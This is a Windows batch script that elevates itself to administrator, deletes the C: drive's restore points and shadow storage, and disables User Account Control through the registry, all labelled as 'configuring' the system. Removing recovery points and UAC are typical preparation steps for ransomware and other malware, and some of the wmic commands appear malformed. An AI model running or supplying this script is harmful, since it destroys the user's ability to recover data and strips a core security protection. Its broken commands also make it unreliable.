@echo off
:: Check for administrator privileges
NET FILE >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
    exit /b
)

:: 1. Disable System Protection for C: drive and delete restore points
echo Configuring System Protection...
wmic shadowsettings set windowsserver=No
wmic shadowstorage delete /nointeractive /on=C:

:: 2. Disable UAC (User Account Control)
echo Configuring Admin mode (disabling UAC)...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

echo All tasks completed.
pause
